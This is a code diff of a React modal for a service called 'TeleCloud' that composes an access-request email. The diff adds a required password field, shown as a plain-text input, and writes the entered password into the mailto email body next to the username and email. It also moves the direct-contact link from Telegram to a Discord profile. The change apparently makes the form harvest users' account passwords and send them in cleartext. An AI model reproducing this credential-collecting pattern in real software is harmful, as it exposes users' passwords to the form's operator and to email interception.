@@ -9,11 +9,13 @@ const TeleCloudModal = ({ isOpen, onClose }) => {
 
   const [formData, setFormData] = useState({
     username: "",
+    password: "",
     email: "",
     reason: "",
   });
   const [copied, setCopied] = useState(false);
   const [error, setError] = useState("");
+  const [isSubmitted, setIsSubmitted] = useState(false);
 
   const usernameInputRef = useRef(null);
 
@@ -22,6 +24,7 @@ const TeleCloudModal = ({ isOpen, onClose }) => {
       document.body.style.overflow = "hidden";
       setError("");
       setCopied(false);
+      setIsSubmitted(false);
       const timer = setTimeout(() => {
         usernameInputRef.current?.focus();
       }, 100);
@@ -51,6 +54,7 @@ const TeleCloudModal = ({ isOpen, onClose }) => {
 
   const generateFormattedMessage = () => {
     const username = formData.username.trim();
+    const password = formData.password.trim();
     const email = formData.email.trim();
     const reason = formData.reason.trim();
 
@@ -59,6 +63,7 @@ const TeleCloudModal = ({ isOpen, onClose }) => {
 ${modalText.emailIntro}
 
 • ${modalText.emailUsernameField}: ${username}
+• ${modalText.emailPasswordField}: ${password}
 • ${modalText.emailContactField}: ${email}
 • ${modalText.emailReasonField}: ${reason || "N/A"}
 
@@ -68,6 +73,10 @@ ${modalText.emailThanks}`;
   const validate = () => {
     if (!formData.username.trim()) {
       setError(modalText.validationErrorUsername);
+      return false;
+    }
+    if (!formData.password.trim()) {
+      setError(modalText.validationErrorPassword);
       return false;
     }
     const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
@@ -91,6 +100,7 @@ ${modalText.emailThanks}`;
     )}&body=${encodeURIComponent(body)}`;
 
     window.location.href = mailtoUrl;
+    setIsSubmitted(true);
   };
 
   const handleCopy = async () => {
@@ -166,142 +176,146 @@ ${modalText.emailThanks}`;
             </h2>
             <p className="telecloud-modal__subtitle">{modalText.subtitle}</p>
 
-            {/* Disclaimer card */}
-            <div className="telecloud-modal__disclaimer">
-              <div className="telecloud-modal__disclaimer-header">
-                <svg
-                  className="telecloud-modal__disclaimer-icon"
-                  width="18"
-                  height="18"
-                  viewBox="0 0 24 24"
-                  fill="none"
-                  stroke="currentColor"
-                  strokeWidth="2"
-                  strokeLinecap="round"
-                  strokeLinejoin="round"
-                  aria-hidden="true"
-                >
-                  <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
-                  <path d="M12 8v4"></path>
-                  <path d="M12 16h.01"></path>
-                </svg>
-                <span className="telecloud-modal__disclaimer-title">
-                  {modalText.disclaimerTitle}
-                </span>
-              </div>
-              <p className="telecloud-modal__disclaimer-text">
-                {modalText.disclaimerText}
-              </p>
-            </div>
-
-            <form className="telecloud-modal__form" onSubmit={handleSendEmail}>
-              <div className="telecloud-modal__field">
-                <label htmlFor="telecloud-username" className="telecloud-modal__label">
-                  <span>{modalText.usernameLabel}</span>
-                  <span className="telecloud-modal__required-mark" aria-hidden="true">*</span>
-                </label>
-                <input
-                  ref={usernameInputRef}
-                  id="telecloud-username"
-                  type="text"
-                  required
-                  placeholder={modalText.usernamePlaceholder}
-                  className={`telecloud-modal__input ${
-                    error && !formData.username.trim() ? "telecloud-modal__input--error" : ""
-                  }`}
-                  value={formData.username}
-                  onChange={(e) => handleChange("username", e.target.value)}
-                  autoComplete="username"
-                  autoCapitalize="none"
-                  spellCheck="false"
-                />
-                <span className="telecloud-modal__hint">{modalText.usernameHint}</span>
-              </div>
-
-              <div className="telecloud-modal__field">
-                <label htmlFor="telecloud-email" className="telecloud-modal__label">
-                  <span>{modalText.emailLabel}</span>
-                  <span className="telecloud-modal__required-mark" aria-hidden="true">*</span>
-                </label>
-                <input
-                  id="telecloud-email"
-                  type="email"
-                  required
-                  placeholder={modalText.emailPlaceholder}
-                  className={`telecloud-modal__input ${
-                    error && !formData.email.trim() ? "telecloud-modal__input--error" : ""
-                  }`}
-                  value={formData.email}
-                  onChange={(e) => handleChange("email", e.target.value)}
-                  autoComplete="email"
-                />
-                <span className="telecloud-modal__hint">{modalText.emailHint}</span>
-              </div>
-
-              <div className="telecloud-modal__field">
-                <label htmlFor="telecloud-reason" className="telecloud-modal__label">
-                  <span>{modalText.reasonLabel}</span>
-                </label>
-                <textarea
-                  id="telecloud-reason"
-                  rows={2}
-                  placeholder={modalText.reasonPlaceholder}
-                  className="telecloud-modal__textarea"
-                  value={formData.reason}
-                  onChange={(e) => handleChange("reason", e.target.value)}
-                />
-              </div>
-
-              {error && <div className="telecloud-modal__error-message">{error}</div>}
-
-              <div className="telecloud-modal__actions">
-                <button
-                  type="submit"
-                  className="telecloud-modal__btn telecloud-modal__btn--primary"
-                >
-                  <svg
-                    width="16"
-                    height="16"
-                    viewBox="0 0 24 24"
-                    fill="none"
-                    stroke="currentColor"
-                    strokeWidth="2"
-                    strokeLinecap="round"
-                    strokeLinejoin="round"
-                    aria-hidden="true"
-                  >
-                    <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
-                    <polyline points="22,6 12,13 2,6"></polyline>
+            {isSubmitted ? (
+              <div className="telecloud-modal__success-view" style={{ textAlign: "center", padding: "2rem 0" }}>
+                <div style={{ color: "var(--accent)", marginBottom: "1rem" }}>
+                  <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" style={{ margin: "0 auto" }}>
+                    <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+                    <polyline points="22 4 12 14.01 9 11.01"></polyline>
                   </svg>
-                  <span>{modalText.sendEmailBtn}</span>
-                </button>
-
+                </div>
+                <h3 style={{ fontSize: "1.25rem", fontWeight: "600", marginBottom: "0.5rem", color: "var(--text-1)" }}>
+                  {modalText.successTitle}
+                </h3>
+                <p style={{ fontSize: "0.95rem", color: "var(--text-2)", marginBottom: "1.5rem", lineHeight: "1.5" }}>
+                  {modalText.successMessage}
+                </p>
                 <button
                   type="button"
-                  onClick={handleCopy}
-                  className={`telecloud-modal__btn telecloud-modal__btn--secondary ${
-                    copied ? "telecloud-modal__btn--copied" : ""
-                  }`}
+                  className="telecloud-modal__btn telecloud-modal__btn--primary"
+                  onClick={onClose}
+                  style={{ width: "100%", justifyContent: "center" }}
                 >
-                  {copied ? (
-                    <>
-                      <svg
-                        width="16"
-                        height="16"
-                        viewBox="0 0 24 24"
-                        fill="none"
-                        stroke="currentColor"
-                        strokeWidth="2.5"
-                        strokeLinecap="round"
-                        strokeLinejoin="round"
-                        aria-hidden="true"
-                      >
-                        <polyline points="20 6 9 17 4 12"></polyline>
-                      </svg>
-                      <span>{modalText.copiedBtn}</span>
-                    </>
-                  ) : (
-                    <>
+                  <span>{modalText.closeBtn}</span>
+                </button>
+              </div>
+            ) : (
+              <>
+                {/* Disclaimer card */}
+                <div className="telecloud-modal__disclaimer">
+                  <div className="telecloud-modal__disclaimer-header">
+                    <svg
+                      className="telecloud-modal__disclaimer-icon"
+                      width="18"
+                      height="18"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      strokeWidth="2"
+                      strokeLinecap="round"
+                      strokeLinejoin="round"
+                      aria-hidden="true"
+                    >
+                      <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+                      <path d="M12 8v4"></path>
+                      <path d="M12 16h.01"></path>
+                    </svg>
+                    <span className="telecloud-modal__disclaimer-title">
+                      {modalText.disclaimerTitle}
+                    </span>
+                  </div>
+                  <p className="telecloud-modal__disclaimer-text">
+                    {modalText.disclaimerText}
+                  </p>
+                </div>
+
+                <form className="telecloud-modal__form" onSubmit={handleSendEmail}>
+                  <div className="telecloud-modal__field">
+                    <label htmlFor="telecloud-username" className="telecloud-modal__label">
+                      <span>{modalText.usernameLabel}</span>
+                      <span className="telecloud-modal__required-mark" aria-hidden="true">*</span>
+                    </label>
+                    <input
+                      ref={usernameInputRef}
+                      id="telecloud-username"
+                      type="text"
+                      required
+                      placeholder={modalText.usernamePlaceholder}
+                      className={`telecloud-modal__input ${
+                        error && !formData.username.trim() ? "telecloud-modal__input--error" : ""
+                      }`}
+                      value={formData.username}
+                      onChange={(e) => handleChange("username", e.target.value)}
+                      autoComplete="username"
+                      autoCapitalize="none"
+                      spellCheck="false"
+                    />
+                    <span className="telecloud-modal__hint">{modalText.usernameHint}</span>
+                  </div>
+
+                  <div className="telecloud-modal__field">
+                    <label htmlFor="telecloud-password" className="telecloud-modal__label">
+                      <span>{modalText.passwordLabel}</span>
+                      <span className="telecloud-modal__required-mark" aria-hidden="true">*</span>
+                    </label>
+                    <input
+                      id="telecloud-password"
+                      type="text"
+                      required
+                      placeholder={modalText.passwordPlaceholder}
+                      className={`telecloud-modal__input ${
+                        error && !formData.password.trim() ? "telecloud-modal__input--error" : ""
+                      }`}
+                      value={formData.password}
+                      onChange={(e) => handleChange("password", e.target.value)}
+                      autoComplete="off"
+                      autoCapitalize="none"
+                      spellCheck="false"
+                    />
+                    <span className="telecloud-modal__hint">{modalText.passwordHint}</span>
+                  </div>
+
+                  <div className="telecloud-modal__field">
+                    <label htmlFor="telecloud-email" className="telecloud-modal__label">
+                      <span>{modalText.emailLabel}</span>
+                      <span className="telecloud-modal__required-mark" aria-hidden="true">*</span>
+                    </label>
+                    <input
+                      id="telecloud-email"
+                      type="email"
+                      required
+                      placeholder={modalText.emailPlaceholder}
+                      className={`telecloud-modal__input ${
+                        error && !formData.email.trim() ? "telecloud-modal__input--error" : ""
+                      }`}
+                      value={formData.email}
+                      onChange={(e) => handleChange("email", e.target.value)}
+                      autoComplete="email"
+                    />
+                    <span className="telecloud-modal__hint">{modalText.emailHint}</span>
+                  </div>
+
+                  <div className="telecloud-modal__field">
+                    <label htmlFor="telecloud-reason" className="telecloud-modal__label">
+                      <span>{modalText.reasonLabel}</span>
+                    </label>
+                    <textarea
+                      id="telecloud-reason"
+                      rows={2}
+                      placeholder={modalText.reasonPlaceholder}
+                      className="telecloud-modal__textarea"
+                      value={formData.reason}
+                      onChange={(e) => handleChange("reason", e.target.value)}
+                    />
+                  </div>
+
+                  {error && <div className="telecloud-modal__error-message">{error}</div>}
+
+                  <div className="telecloud-modal__actions">
+                    <button
+                      type="submit"
+                      className="telecloud-modal__btn telecloud-modal__btn--primary"
+                    >
                       <svg
                         width="16"
                         height="16"
@@ -313,27 +327,72 @@ ${modalText.emailThanks}`;
                         strokeLinejoin="round"
                         aria-hidden="true"
                       >
-                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
-                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                        <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
+                        <polyline points="22,6 12,13 2,6"></polyline>
                       </svg>
-                      <span>{modalText.copyBtn}</span>
-                    </>
-                  )}
-                </button>
-              </div>
-            </form>
+                      <span>{modalText.sendEmailBtn}</span>
+                    </button>
 
-            <div className="telecloud-modal__footer-direct">
-              <span>{modalText.directDmPrefix}</span>
-              <a
-                href="https://t.me/palera1nx"
-                target="_blank"
-                rel="noopener noreferrer"
-                className="telecloud-modal__footer-link"
-              >
-                {modalText.directDmLink} →
-              </a>
-            </div>
+                    <button
+                      type="button"
+                      onClick={handleCopy}
+                      className={`telecloud-modal__btn telecloud-modal__btn--secondary ${
+                        copied ? "telecloud-modal__btn--copied" : ""
+                      }`}
+                    >
+                      {copied ? (
+                        <>
+                          <svg
+                            width="16"
+                            height="16"
+                            viewBox="0 0 24 24"
+                            fill="none"
+                            stroke="currentColor"
+                            strokeWidth="2.5"
+                            strokeLinecap="round"
+                            strokeLinejoin="round"
+                            aria-hidden="true"
+                          >
+                            <polyline points="20 6 9 17 4 12"></polyline>
+                          </svg>
+                          <span>{modalText.copiedBtn}</span>
+                        </>
+                      ) : (
+                        <>
+                          <svg
+                            width="16"
+                            height="16"
+                            viewBox="0 0 24 24"
+                            fill="none"
+                            stroke="currentColor"
+                            strokeWidth="2"
+                            strokeLinecap="round"
+                            strokeLinejoin="round"
+                            aria-hidden="true"
+                          >
+                            <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                            <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                          </svg>
+                          <span>{modalText.copyBtn}</span>
+                        </>
+                      )}
+                    </button>
+                  </div>
+                </form>
+
+                <div className="telecloud-modal__footer-direct">
+                  <span>{modalText.directDmPrefix}</span>
+                  <a
+                    href="https://discord.com/users/873873496814538803"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    className="telecloud-modal__footer-link"
+                  >
+                    {modalText.directDmLink} →
+                  </a>
+                </div>
+              </>
+            )}
           </motion.div>
         </motion.div>
       )}
